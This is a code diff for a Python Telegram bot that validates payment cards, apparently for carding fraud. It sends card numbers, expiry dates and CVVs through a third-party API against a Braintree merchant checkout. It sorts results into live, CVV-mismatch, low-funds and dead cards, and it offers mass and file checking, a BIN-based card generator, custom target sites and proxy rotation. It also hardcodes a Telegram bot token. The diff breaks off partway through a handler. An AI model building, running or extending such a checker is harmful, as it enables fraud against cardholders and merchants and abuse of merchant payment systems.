@@ -13,7 +13,7 @@ import os
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-BOT_TOKEN = '8388599467:AAHpsWxvSma5U_QFMqOa-qilroPGO9m5hKk'
+BOT_TOKEN = '8770871462:AAFrOsWeGQxHVdjQ0SUbTJaODAFLKDPD1jE'
 ADMIN_ID = 5629984144
 bot = telebot.TeleBot(BOT_TOKEN)
 
@@ -53,23 +53,20 @@ def set_proxy(proxy_url):
     if test_proxy(proxy_url):
         with PROXY_LOCK:
             ACTIVE_PROXY = proxy_url
-        return True, "Proxy is live and set successfully!"
-    return False, "Proxy is dead or unreachable"
+        return True, "✅ Proxy is live and set successfully!"
+    return False, "❌ Proxy is dead or unreachable"
 
 def remove_proxy():
     global ACTIVE_PROXY
     with PROXY_LOCK:
         ACTIVE_PROXY = None
-    return "Proxy removed. Using direct connection."
+    return "✅ Proxy removed. Using direct connection."
 
 def get_proxies():
     with PROXY_LOCK:
         return {'http': ACTIVE_PROXY, 'https': ACTIVE_PROXY} if ACTIVE_PROXY else None
 
-# Default site - Coca-Cola
 DEFAULT_BRAINTREE_SITE = "https://www.coca-colastore.com"
-
-# Jossalicious API endpoint
 JOSS_API = "https://jossalicious.org/b3/api/wpg.php"
 
 user_sessions = {}
@@ -233,19 +230,17 @@ class BraintreeChecker:
             if not luhn_check(number):
                 return {'status': 'error', 'message': 'Invalid card (Luhn failed)', 'icon': '❌', 'card_info': card_info, 'time': 0}
             
-            # Fix year format
             if len(exp_year) == 4:
                 exp_year = exp_year[-2:]
             elif len(exp_year) == 1:
                 exp_year = f"0{exp_year}"
             
         except Exception as e:
-            return {'status': 'error', 'message': f'Parse error', 'icon': '❌', 'time': 0}
+            return {'status': 'error', 'message': 'Parse error', 'icon': '❌', 'time': 0}
         
         site_url = get_braintree_site(self.chat_id)
         
         try:
-            # Use Jossalicious API
             params = {
                 'lista': f"{number}|{exp_month}|{exp_year}|{cvv}",
                 'proxy': '',
@@ -274,8 +269,6 @@ class BraintreeChecker:
             
             response_text = response.text.lower()
             
-            # Parse response
-            # CVV responses
             if 'cvv' in response_text or 'security code' in response_text:
                 return {
                     'status': 'live_cvv',
@@ -285,7 +278,6 @@ class BraintreeChecker:
                     'time': elapsed_time
                 }
             
-            # Insufficient funds
             if 'insufficient' in response_text or 'insufficient funds' in response_text:
                 return {
                     'status': 'insufficient',
@@ -295,7 +287,6 @@ class BraintreeChecker:
                     'time': elapsed_time
                 }
             
-            # Success responses
             if any(word in response_text for word in ['approved', 'success', 'authorized', 'thank you', 'payment successful']):
                 return {
                     'status': 'live',
@@ -305,9 +296,7 @@ class BraintreeChecker:
                     'time': elapsed_time
                 }
             
-            # Dead responses
             if any(word in response_text for word in ['declined', 'fraud', 'stolen', 'lost', 'invalid', 'rejected', 'processor declined']):
-                # Extract specific message
                 message = 'Card Declined'
                 if 'fraud' in response_text:
                     message = 'Gateway Rejected: fraud'
@@ -322,7 +311,6 @@ class BraintreeChecker:
                     'time': elapsed_time
                 }
             
-            # Default dead
             return {
                 'status': 'dead',
                 'message': 'Card Declined',
@@ -349,8 +337,6 @@ class BraintreeChecker:
                 'card_info': card_info,
                 'time': elapsed_time
             }
-
-# ============ BOT COMMANDS ============
 
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
@@ -508,61 +494,633 @@ def braintree_check(message):
     command_parts = message.text.split(maxsplit=1)
     
     if len(command_parts) < 2:
-        text = "╔════════════════════╗\n"
-        text += "║  ❌ INVALID FORMAT  ║\n"
-        text += "╚════════════════════╝\n\n"
-        text += "Usage: /bchk card|mm|yy|cvv"
-        bot.send_message(message.chat.id, text)
-        return
+        if message.chat.id in user_sessions and 'generated_cards' in user_sessions[message.chat.id]:
+            cards = user_sessions[message.chat.id]['generated_cards']
+            if cards:
+                card_input = cards[0]
+            else:
+                text = "╔════════════════════╗\n"
+                text += "║  ❌ INVALID FORMAT  ║\n"
+                text += "╚════════════════════╝\n\n"
+                text += "Usage: /bchk card|mm|yy|cvv"
+                bot.send_message(message.chat.id, text)
+                return
+        else:
+            text = "╔════════════════════╗\n"
+            text += "║  ❌ INVALID FORMAT  ║\n"
+            text += "╚════════════════════╝\n\n"
+            text += "Usage: /bchk card|mm|yy|cvv"
+            bot.send_message(message.chat.id, text)
+            return
+    else:
+        card_input = command_parts[1].strip()
     
-    card_input = command_parts[1].strip()
     status_msg = bot.send_message(message.chat.id, f"⏳ Checking card...\n\n💳 {card_input}")
     
     checker = BraintreeChecker(message.chat.id)
     result = checker.validate_card(card_input)
     card_info = result.get('card_info', {})
     
-    # Format response based on status
     if result['status'] == 'live':
-        check_response = f"<b>𝗦𝘁𝗮𝘁𝘂𝘀 ⇾ success</b>\n"
-        check_response += f"<b>𝗖𝗖 ⇾</b> <code>{card_input}</code>\n"
-        check_response += f"<b>𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾</b> Braintree\n"
-        check_response += f"<b>𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾</b> {result['message']}\n"
-        check_response += f"<b>𝗕𝗮𝗻𝗸:</b> {card_info.get('bank', 'Unknown')}\n"
-        check_response += f"<b>𝗖𝗼𝘂𝗻𝘁𝗿𝘆:</b> {card_info.get('country', 'Unknown')}\n"
-        check_response += f"<b>𝗧𝗼𝗼𝗸:</b> {result['time']}s"
+        check_response = "╔═══════════════════════════════╗\n"
+        check_response += "║ <b>CARD VALIDATION RESULT</b> ║\n"
+        check_response += "╚═══════════════════════════════╝\n\n"
+        check_response += f"<b>Card:</b> <code>{card_input}</code>\n\n"
+        check_response += f"<b>Status: ✅ Card Live</b>\n\n"
+        check_response += "<b>Card Info:</b>\n"
+        check_response += f"• Brand: {card_info.get('brand', 'Unknown')}\n"
+        check_response += f"• Type: {card_info.get('type', 'Unknown')}\n"
+        check_response += f"• Level: {card_info.get('level', 'Unknown')}\n"
+        check_response += f"• Bank: {card_info.get('bank', 'Unknown')}\n"
+        check_response += f"• Country: {card_info.get('flag', '🌍')} {card_info.get('country', 'Unknown')}\n\n"
+        check_response += f"<b>Gateway:</b> Braintree\n"
+        check_response += f"<b>Response:</b> {result['message']}\n\n"
+        check_response += f"<b>Checked by:</b> @{message.from_user.username or 'User'}\n"
+        check_response += f"<b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
     elif result['status'] == 'live_cvv':
-        check_response = f"<b>𝗦𝘁𝗮𝘁𝘂𝘀 ⇾ ccn</b>\n"
-        check_response += f"<b>𝗖𝗖 ⇾</b> <code>{card_input}</code>\n"
-        check_response += f"<b>𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾</b> Braintree\n"
-        check_response += f"<b>𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾</b> {result['message']}\n"
-        check_response += f"<b>𝗕𝗮𝗻𝗸:</b> {card_info.get('bank', 'Unknown')}\n"
-        check_response += f"<b>𝗖𝗼𝘂𝗻𝘁𝗿𝘆:</b> {card_info.get('country', 'Unknown')}\n"
-        check_response += f"<b>𝗧𝗼𝗼𝗸:</b> {result['time']}s"
+        check_response = "╔═══════════════════════════════╗\n"
+        check_response += "║ <b>CARD VALIDATION RESULT</b> ║\n"
+        check_response += "╚═══════════════════════════════╝\n\n"
+        check_response += f"<b>Card:</b> <code>{card_input}</code>\n\n"
+        check_response += f"<b>Status: ⚠️ CVV Mismatch</b>\n\n"
+        check_response += "<b>Card Info:</b>\n"
+        check_response += f"• Brand: {card_info.get('brand', 'Unknown')}\n"
+        check_response += f"• Type: {card_info.get('type', 'Unknown')}\n"
+        check_response += f"• Level: {card_info.get('level', 'Unknown')}\n"
+        check_response += f"• Bank: {card_info.get('bank', 'Unknown')}\n"
+        check_response += f"• Country: {card_info.get('flag', '🌍')} {card_info.get('country', 'Unknown')}\n\n"
+        check_response += f"<b>Gateway:</b> Braintree\n"
+        check_response += f"<b>Response:</b> {result['message']}\n\n"
+        check_response += f"<b>Checked by:</b> @{message.from_user.username or 'User'}\n"
+        check_response += f"<b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
     elif result['status'] == 'insufficient':
-        check_response = f"<b>𝗦𝘁𝗮𝘁𝘂𝘀 ⇾ insuff</b>\n"
-        check_response += f"<b>𝗖𝗖 ⇾</b> <code>{card_input}</code>\n"
-        check_response += f"<b>𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾</b> Braintree\n"
-        check_response += f"<b>𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾</b> {result['message']}\n"
-        check_response += f"<b>𝗕𝗮𝗻𝗸:</b> {card_info.get('bank', 'Unknown')}\n"
-        check_response += f"<b>𝗖𝗼𝘂𝗻𝘁𝗿𝘆:</b> {card_info.get('country', 'Unknown')}\n"
-        check_response += f"<b>𝗧𝗼𝗼𝗸:</b> {result['time']}s"
+        check_response = "╔═══════════════════════════════╗\n"
+        check_response += "║ <b>CARD VALIDATION RESULT</b> ║\n"
+        check_response += "╚═══════════════════════════════╝\n\n"
+        check_response += f"<b>Card:</b> <code>{card_input}</code>\n\n"
+        check_response += f"<b>Status: 💰 Insufficient Funds</b>\n\n"
+        check_response += "<b>Card Info:</b>\n"
+        check_response += f"• Brand: {card_info.get('brand', 'Unknown')}\n"
+        check_response += f"• Type: {card_info.get('type', 'Unknown')}\n"
+        check_response += f"• Level: {card_info.get('level', 'Unknown')}\n"
+        check_response += f"• Bank: {card_info.get('bank', 'Unknown')}\n"
+        check_response += f"• Country: {card_info.get('flag', '🌍')} {card_info.get('country', 'Unknown')}\n\n"
+        check_response += f"<b>Gateway:</b> Braintree\n"
+        check_response += f"<b>Response:</b> {result['message']}\n\n"
+        check_response += f"<b>Checked by:</b> @{message.from_user.username or 'User'}\n"
+        check_response += f"<b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
     else:
-        check_response = f"<b>𝗦𝘁𝗮𝘁𝘂𝘀 ⇾ dead</b>\n"
-        check_response += f"<b>𝗖𝗖 ⇾</b> <code>{card_input}</code>\n"
-        check_response += f"<b>𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾</b> Braintree\n"
-        check_response += f"<b>𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾</b> {result['message']}\n"
-        check_response += f"<b>𝗕𝗮𝗻𝗸:</b> {card_info.get('bank', 'Unknown')}\n"
-        check_response += f"<b>𝗖𝗼𝘂𝗻𝘁𝗿𝘆:</b> {card_info.get('country', 'Unknown')}\n"
-        check_response += f"<b>𝗧𝗼𝗼𝗸:</b> {result['time']}s"
+        check_response = "╔═══════════════════════════════╗\n"
+        check_response += "║ <b>CARD VALIDATION RESULT</b> ║\n"
+        check_response += "╚═══════════════════════════════╝\n\n"
+        check_response += f"<b>Card:</b> <code>{card_input}</code>\n\n"
+        check_response += f"<b>Status: ❌ Card Dead</b>\n\n"
+        check_response += "<b>Card Info:</b>\n"
+        check_response += f"• Brand: {card_info.get('brand', 'Unknown')}\n"
+        check_response += f"• Type: {card_info.get('type', 'Unknown')}\n"
+        check_response += f"• Level: {card_info.get('level', 'Unknown')}\n"
+        check_response += f"• Bank: {card_info.get('bank', 'Unknown')}\n"
+        check_response += f"• Country: {card_info.get('flag', '🌍')} {card_info.get('country', 'Unknown')}\n\n"
+        check_response += f"<b>Gateway:</b> Braintree\n"
+        check_response += f"<b>Response:</b> {result['message']}\n\n"
+        check_response += f"<b>Checked by:</b> @{message.from_user.username or 'User'}\n"
+        check_response += f"<b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
     
     bot.edit_message_text(check_response, message.chat.id, status_msg.message_id, parse_mode='HTML')
 
-# Continue with rest of commands (bmass, bfile, bin, gen, custom_site, proxy, broadcast, help) from previous code...
-# (Due to length, I'm showing the key parts - the rest remains the same)
+@bot.message_handler(commands=['bmass'])
+@require_approval
+def braintree_mass(message):
+    can_proceed, remaining = check_cooldown(message.chat.id, 'mass')
+    if not can_proceed:
+        text = "╔════════════════════╗\n"
+        text += "║  ⏳ COOLDOWN ACTIVE  ║\n"
+        text += "╚════════════════════╝\n\n"
+        text += f"⏱️ Wait {remaining} seconds"
+        bot.send_message(message.chat.id, text)
+        return
+    
+    command_parts = message.text.split(maxsplit=1)
+    
+    if len(command_parts) < 2:
+        if message.chat.id in user_sessions and 'generated_cards' in user_sessions[message.chat.id]:
+            cards = user_sessions[message.chat.id]['generated_cards']
+            if not cards:
+                text = "╔════════════════════╗\n"
+                text += "║  ❌ INVALID FORMAT  ║\n"
+                text += "╚════════════════════╝\n\n"
+                text += f"Usage: /bmass card1|mm|yy|cvv\ncard2|mm|yy|cvv\n\n"
+                text += f"Max: {MAX_MASS_CARDS} cards"
+                bot.send_message(message.chat.id, text)
+                return
+            if len(cards) > MAX_MASS_CARDS:
+                text = "╔════════════════════╗\n"
+                text += "║  ❌ TOO MANY CARDS  ║\n"
+                text += "╚════════════════════╝\n\n"
+                text += f"You generated {len(cards)} cards\n"
+                text += f"Max for /bmass: {MAX_MASS_CARDS}\n\n"
+                text += "💡 Use /bfile for more cards"
+                bot.send_message(message.chat.id, text)
+                return
+        else:
+            text = "╔════════════════════╗\n"
+            text += "║  ❌ INVALID FORMAT  ║\n"
+            text += "╚════════════════════╝\n\n"
+            text += f"Usage: /bmass card1|mm|yy|cvv\ncard2|mm|yy|cvv\n\n"
+            text += f"Max: {MAX_MASS_CARDS} cards"
+            bot.send_message(message.chat.id, text)
+            return
+    else:
+        cards_text = command_parts[1].strip()
+        cards = [c.strip() for c in cards_text.split('\n') if c.strip()]
+    
+    if len(cards) > MAX_MASS_CARDS:
+        text = "╔════════════════════╗\n"
+        text += "║  ❌ TOO MANY CARDS  ║\n"
+        text += "╚════════════════════╝\n\n"
+        text += f"Max: {MAX_MASS_CARDS} cards\n"
+        text += f"You sent: {len(cards)} cards"
+        bot.send_message(message.chat.id, text)
+        return
+    
+    status_msg = bot.send_message(message.chat.id, f"⏳ Checking {len(cards)} cards...")
+    
+    checker = BraintreeChecker(message.chat.id)
+    results = []
+    
+    for idx, card in enumerate(cards, 1):
+        bot.edit_message_text(f"⏳ Checking {idx}/{len(cards)}...\n\n💳 {card}", message.chat.id, status_msg.message_id)
+        result = checker.validate_card(card)
+        results.append((card, result))
+        time.sleep(1)
+    
+    mass_response = "╔════════════════════════╗\n"
+    mass_response += "║  📦 MASS CHECK RESULTS  ║\n"
+    mass_response += "╚════════════════════════╝\n\n"
+    mass_response += f"✅ Total: {len(results)} cards\n"
+    mass_response += "━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+    
+    for card, result in results:
+        mass_response += f"{result['icon']} <code>{card}</code>\n"
+        mass_response += f"└ {result['message']} ({result['time']}s)\n\n"
+    
+    mass_response += "━━━━━━━━━━━━━━━━━━━━━━━━\n"
+    mass_response += f"👤 By: @{message.from_user.username or 'User'}"
+    
+    bot.edit_message_text(mass_response, message.chat.id, status_msg.message_id, parse_mode='HTML')
+
+@bot.message_handler(commands=['bfile'])
+@require_approval
+def request_braintree_file(message):
+    text = "╔════════════════════╗\n"
+    text += "║  📁 UPLOAD FILE  ║\n"
+    text += "╚════════════════════╝\n\n"
+    text += "📤 Please upload .txt file\n"
+    text += "━━━━━━━━━━━━━━━━━━━━━━━━\n"
+    text += "📝 Format: card|mm|yy|cvv\n"
+    text += "📊 One card per line\n"
+    text += f"📈 Max: {MAX_FILE_CARDS} cards"
+    bot.send_message(message.chat.id, text)
+    user_sessions[message.chat.id] = {'awaiting_file': True}
+
+@bot.message_handler(content_types=['document'])
+@require_approval
+def handle_braintree_file(message):
+    if message.chat.id not in user_sessions or not user_sessions[message.chat.id].get('awaiting_file'):
+        bot.send_message(message.chat.id, "❌ Please use /bfile command first")
+        return
+    
+    user_sessions[message.chat.id]['awaiting_file'] = False
+    
+    if not message.document.file_name.endswith('.txt'):
+        text = "╔════════════════════╗\n"
+        text += "║  ❌ INVALID FILE  ║\n"
+        text += "╚════════════════════╝\n\n"
+        text += "Please upload a .txt file"
+        bot.send_message(message.chat.id, text)
+        return
+    
+    can_proceed, remaining = check_cooldown(message.chat.id, 'mass')
+    if not can_proceed:
+        text = "╔════════════════════╗\n"
+        text += "║  ⏳ COOLDOWN ACTIVE  ║\n"
+        text += "╚════════════════════╝\n\n"
+        text += f"⏱️ Wait {remaining} seconds"
+        bot.send_message(message.chat.id, text)
+        return
+    
+    try:
+        file_info = bot.get_file(message.document.file_id)
+        downloaded_file = bot.download_file(file_info.file_path)
+        
+        cards_text = downloaded_file.decode('utf-8')
+        cards = [c.strip() for c in cards_text.split('\n') if c.strip() and '|' in c]
+        
+        if len(cards) > MAX_FILE_CARDS:
+            text = "╔════════════════════╗\n"
+            text += "║  ❌ TOO MANY CARDS  ║\n"
+            text += "╚════════════════════╝\n\n"
+            text += f"Max: {MAX_FILE_CARDS} cards\n"
+            text += f"Your file: {len(cards)} cards"
+            bot.send_message(message.chat.id, text)
+            return
+        
+        if len(cards) == 0:
+            text = "╔════════════════════╗\n"
+            text += "║  ❌ EMPTY FILE  ║\n"
+            text += "╚════════════════════╝\n\n"
+            text += "No valid cards found"
+            bot.send_message(message.chat.id, text)
+            return
+        
+        stop_checking[message.chat.id] = False
+        
+        stop_markup = types.InlineKeyboardMarkup()
+        stop_markup.add(types.InlineKeyboardButton("🛑 STOP", callback_data=f"stop_check_{message.chat.id}"))
+        
+        status_msg = bot.send_message(message.chat.id, "⏳ Initializing file check...", reply_markup=stop_markup)
+        
+        checker = BraintreeChecker(message.chat.id)
+        results = []
+        live_count = 0
+        cvv_count = 0
+        low_funds_count = 0
+        dead_count = 0
+        
+        for idx, card in enumerate(cards, 1):
+            if stop_checking.get(message.chat.id, False):
+                break
+            
+            result = checker.validate_card(card)
+            results.append((card, result))
+            
+            if result['status'] == 'live':
+                live_count += 1
+            elif result['status'] == 'live_cvv':
+                cvv_count += 1
+            elif result['status'] == 'insufficient':
+                low_funds_count += 1
+            else:
+                dead_count += 1
+            
+            progress_percent = int((idx / len(cards)) * 100)
+            bar_length = 20
+            filled_length = int(bar_length * idx // len(cards))
+            bar = '█' * filled_length + '░' * (bar_length - filled_length)
+            
+            progress_msg = "╔════════════════════════════╗\n"
+            progress_msg += "║   📊 FILE CHECK IN PROGRESS   ║\n"
+            progress_msg += "╚════════════════════════════╝\n\n"
+            progress_msg += "🎯 <b>LIVE STATISTICS</b>\n"
+            progress_msg += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+            progress_msg += f"<b>✅ Live:</b> <code>{live_count}</code>\n"
+            progress_msg += f"<b>⚠️ CVV:</b> <code>{cvv_count}</code>\n"
+            progress_msg += f"<b>💰 Low Balance:</b> <code>{low_funds_count}</code>\n"
+            progress_msg += f"<b>❌ Dead:</b> <code>{dead_count}</code>\n\n"
+            progress_msg += "📈 <b>PROGRESS</b>\n"
+            progress_msg += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+            progress_msg += f"<code>[{bar}]</code>\n"
+            progress_msg += f"<b>{progress_percent}%</b> • <code>{idx}/{len(cards)}</code> cards\n\n"
+            progress_msg += f"⏱️ <i>Checking card #{idx}...</i>"
+            
+            try:
+                bot.edit_message_text(progress_msg, message.chat.id, status_msg.message_id, 
+                                     parse_mode='HTML', reply_markup=stop_markup)
+            except:
+                pass
+            
+            time.sleep(1)
+        
+        was_stopped = stop_checking.get(message.chat.id, False)
+        stop_checking[message.chat.id] = False
+        
+        file_response = "╔════════════════════════════╗\n"
+        if was_stopped:
+            file_response += "║   🛑 CHECK STOPPED BY USER   ║\n"
+        else:
+            file_response += "║   ✅ FILE CHECK COMPLETE   ║\n"
+        file_response += "╚════════════════════════════╝\n\n"
+        file_response += "📊 <b>FINAL RESULTS</b>\n"
+        file_response += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+        file_response += f"<b>📥 Total Cards:</b> <code>{len(results)}</code>\n"
+        file_response += f"<b>✅ Live:</b> <code>{live_count}</code>\n"
+        file_response += f"<b>⚠️ CVV:</b> <code>{cvv_count}</code>\n"
+        file_response += f"<b>💰 Low Balance:</b> <code>{low_funds_count}</code>\n"
+        file_response += f"<b>❌ Dead:</b> <code>{dead_count}</code>\n\n"
+        
+        if live_count > 0 or cvv_count > 0 or low_funds_count > 0:
+            file_response += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+            file_response += "🎯 <b>LIVE CARDS FOUND</b>\n"
+            file_response += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+            for card, result in results:
+                if result['status'] in ['live', 'live_cvv', 'insufficient']:
+                    file_response += f"{result['icon']} <code>{card}</code>\n"
+                    file_response += f"└ <i>{result['message']}</i>\n\n"
+        else:
+            file_response += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+            file_response += "❌ <b>NO LIVE CARDS FOUND</b>\n"
+            file_response += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+        
+        file_response += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+        file_response += f"👤 <b>Checked by:</b> @{message.from_user.username or 'User'}\n"
+        file_response += f"🕐 <b>Time:</b> {datetime.now().strftime('%H:%M:%S')}"
+        
+        bot.edit_message_text(file_response, message.chat.id, status_msg.message_id, parse_mode='HTML')
+        
+    except Exception as e:
+        bot.send_message(message.chat.id, f"❌ Error: {str(e)}")
+
+@bot.message_handler(commands=['bin'])
+@require_approval
+def check_bin(message):
+    command_parts = message.text.split(maxsplit=1)
+    if len(command_parts) < 2:
+        text = "╔════════════════════╗\n"
+        text += "║  ❌ INVALID FORMAT  ║\n"
+        text += "╚════════════════════╝\n\n"
+        text += "Usage: /bin 464995"
+        bot.send_message(message.chat.id, text)
+        return
+    bin_number = command_parts[1].strip()
+    if not bin_number.isdigit() or len(bin_number) < 6:
+        text = "╔════════════════════╗\n"
+        text += "║   ❌ INVALID BIN   ║\n"
+        text += "╚════════════════════╝\n\n"
+        text += "BIN must be at least 6 digits"
+        bot.send_message(message.chat.id, text)
+        return
+    
+    status_msg = bot.send_message(message.chat.id, "🔍 Looking up BIN...")
+    card_info = get_card_info(bin_number.ljust(16, '0'))
+    
+    bin_response = "╔════════════════════════╗\n"
+    bin_response += "║   🔍 BIN LOOKUP   ║\n"
+    bin_response += "╚════════════════════════╝\n\n"
+    bin_response += f"🔢 BIN: {bin_number}\n"
+    bin_response += "━━━━━━━━━━━━━━━━━━━━━━━━\n"
+    bin_response += f"💳 Brand: {card_info.get('brand', 'Unknown')}\n"
+    bin_response += f"📊 Type: {card_info.get('type', 'Unknown')}\n"
+    bin_response += f"⭐ Level: {card_info.get('level', 'Unknown')}\n"
+    bin_response += f"🏦 Bank: {card_info.get('bank', 'Unknown')}\n"
+    bin_response += f"{card_info.get('flag', '🌍')} Country: {card_info.get('country', 'Unknown')}\n"
+    bin_response += "━━━━━━━━━━━━━━━━━━━━━━━━\n"
+    bin_response += f"👤 By: @{message.from_user.username or 'User'}"
+    
+    bot.edit_message_text(bin_response, message.chat.id, status_msg.message_id)
+
+@bot.message_handler(commands=['gen'])
+@require_approval
+def generate_cards_command(message):
+    command_parts = message.text.split()
+    if len(command_parts) < 2:
+        text = "╔════════════════════╗\n"
+        text += "║  ❌ INVALID FORMAT  ║\n"
+        text += "╚════════════════════╝\n\n"
+        text += "Usage:\n"
+        text += "/gen 453212 10 - Random date\n"
+        text += "/gen 453212|06|30 10 - Specific date\n\n"
+        text += "Max: 20 cards per request"
+        bot.send_message(message.chat.id, text)
+        return
+    
+    bin_input = command_parts[1].strip()
+    exp_month = None
+    exp_year = None
+    
+    if '|' in bin_input:
+        parts = bin_input.split('|')
+        bin_input = parts[0]
+        if len(parts) >= 3:
+            try:
+                exp_month = parts[1].strip()
+                exp_year = parts[2].strip()
+            except:
+                pass
+    
+    bin_input = bin_input.replace('x', '').replace('X', '')
+    bin_number = ''.join(c for c in bin_input if c.isdigit())
+    
+    quantity = 10
+    if len(command_parts) > 2:
+        try:
+            quantity = int(command_parts[2])
+        except:
+            quantity = 10
+    
+    if not bin_number or len(bin_number) < 6:
+        text = "╔════════════════════╗\n"
+        text += "║   ❌ INVALID BIN   ║\n"
+        text += "╚════════════════════╝\n\n"
+        text += "BIN must be at least 6 digits"
+        bot.send_message(message.chat.id, text)
+        return
+    
+    bin_number = bin_number[:8] if len(bin_number) > 8 else bin_number
+    
+    status_msg = bot.send_message(message.chat.id, f"🎲 Generating {quantity} cards...")
+    
+    cards, error = generate_cards(bin_number, quantity, exp_month, exp_year)
+    if error:
+        bot.edit_message_text(f"❌ Error: {error}", message.chat.id, status_msg.message_id)
+        return
+    
+    user_sessions[message.chat.id] = {'generated_cards': cards}
+    
+    card_info = get_card_info(bin_number.ljust(16, '0'))
+    date_info = "Random dates" if not exp_month else f"{exp_month}/{exp_year}"
+    
+    gen_response = "╔════════════════════════╗\n"
+    gen_response += "║  🎲 GENERATED CARDS  ║\n"
+    gen_response += "╚════════════════════════╝\n\n"
+    gen_response += f"🔢 BIN: {bin_number}\n"
+    gen_response += f"💳 Brand: {card_info.get('brand', 'Unknown')}\n"
+    gen_response += f"{card_info.get('flag', '🌍')} Country: {card_info.get('country', 'Unknown')}\n"
+    gen_response += f"🏦 Bank: {card_info.get('bank', 'Unknown')}\n"
+    gen_response += f"📅 Expiry: {date_info}\n"
+    gen_response += "━━━━━━━━━━━━━━━━━━━━━━━━\n"
+    gen_response += f"✨ Generated {len(cards)} Cards\n"
+    gen_response += "━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+    
+    for card in cards:
+        gen_response += f"💳 {card}\n"
+    
+    gen_response += "\n⚠️ For testing purposes only\n"
+    gen_response += "💡 Tip: Use /bchk or /bmass to check!"
+    
+    bot.edit_message_text(gen_response, message.chat.id, status_msg.message_id)
+
+@bot.message_handler(commands=['custom_site'])
+@require_approval
+def custom_site_command(message):
+    command_parts = message.text.split(maxsplit=1)
+    if len(command_parts) < 2:
+        text = "╔════════════════════╗\n"
+        text += "║  🌍 CUSTOM SITE  ║\n"
+        text += "╚════════════════════╝\n\n"
+        text += "Usage:\n"
+        text += "/custom_site https://yoursite.com\n\n"
+        text += "💡 Set your own site for checking"
+        bot.send_message(message.chat.id, text)
+        return
+    
+    site_url = command_parts[1].strip()
+    
+    if not site_url.startswith('http://') and not site_url.startswith('https://'):
+        bot.send_message(message.chat.id, "❌ URL must start with http:// or https://")
+        return
+    
+    user_custom_sites[message.chat.id] = site_url
+    
+    text = "╔════════════════════╗\n"
+    text += "║  ✅ SITE SET  ║\n"
+    text += "╚════════════════════╝\n\n"
+    text += f"🌍 Your custom site:\n{site_url}\n\n"
+    text += "✅ All your checks will use this site"
+    bot.send_message(message.chat.id, text)
+
+@bot.message_handler(commands=['remove_site'])
+@require_approval
+def remove_site_command(message):
+    if message.chat.id in user_custom_sites:
+        del user_custom_sites[message.chat.id]
+        text = "╔════════════════════╗\n"
+        text += "║  🗑️ SITE REMOVED  ║\n"
+        text += "╚════════════════════╝\n\n"
+        text += "✅ Custom site removed\n"
+        text += "🔄 Using default site now"
+    else:
+        text = "╔════════════════════╗\n"
+        text += "║  ℹ️ NO CUSTOM SITE  ║\n"
+        text += "╚════════════════════╝\n\n"
+        text += "You're using the default site"
+    bot.send_message(message.chat.id, text)
+
+@bot.message_handler(commands=['site'])
+@require_approval
+def check_current_site(message):
+    current_site = get_braintree_site(message.chat.id)
+    is_custom = message.chat.id in user_custom_sites
+    
+    text = "╔════════════════════════╗\n"
+    text += "║  🌍 CURRENT SITE  ║\n"
+    text += "╚════════════════════════╝\n\n"
+    text += f"{'🔧 Custom' if is_custom else '📌 Default'} Site:\n{current_site}"
+    bot.send_message(message.chat.id, text)
+
+@bot.message_handler(commands=['proxy'])
+def set_proxy_command(message):
+    if message.from_user.id != ADMIN_ID:
+        bot.send_message(message.chat.id, "🚫 Admin only command")
+        return
+    
+    command_parts = message.text.split(maxsplit=1)
+    if len(command_parts) < 2:
+        text = "╔════════════════════╗\n"
+        text += "║   🌐 SET PROXY   ║\n"
+        text += "╚════════════════════╝\n\n"
+        text += "Usage:\n/proxy http://user:pass@host:port"
+        bot.send_message(message.chat.id, text)
+        return
+    
+    proxy_url = command_parts[1].strip()
+    status_msg = bot.send_message(message.chat.id, "⏳ Testing proxy...")
+    success, msg = set_proxy(proxy_url)
+    bot.edit_message_text(msg, message.chat.id, status_msg.message_id)
+
+@bot.message_handler(commands=['removeproxy'])
+def remove_proxy_command(message):
+    if message.from_user.id != ADMIN_ID:
+        bot.send_message(message.chat.id, "🚫 Admin only command")
+        return
+    bot.send_message(message.chat.id, remove_proxy())
+
+@bot.message_handler(commands=['proxystatus'])
+def proxy_status_command(message):
+    if message.from_user.id != ADMIN_ID:
+        bot.send_message(message.chat.id, "🚫 Admin only command")
+        return
+    
+    with PROXY_LOCK:
+        if ACTIVE_PROXY:
+            text = f"╔════════════════════╗\n║  📊 PROXY STATUS  ║\n╚════════════════════╝\n\n🟢 Active\n🌐 {ACTIVE_PROXY}"
+        else:
+            text = "╔════════════════════╗\n║  📊 PROXY STATUS  ║\n╚════════════════════╝\n\n🔴 Not set"
+        bot.send_message(message.chat.id, text)
+
+@bot.message_handler(commands=['users'])
+def list_users_command(message):
+    if message.from_user.id != ADMIN_ID:
+        bot.send_message(message.chat.id, "🚫 Admin only command")
+        return
+    if not approved_users:
+        bot.send_message(message.chat.id, "📭 No approved users yet")
+        return
+    text = "╔════════════════════╗\n║  👥 APPROVED USERS  ║\n╚════════════════════╝\n\n"
+    for idx, uid in enumerate(approved_users, 1):
+        text += f"{idx}. 🆔 {uid}\n"
+    bot.send_message(message.chat.id, text)
+
+@bot.message_handler(commands=['pending'])
+def list_pending_command(message):
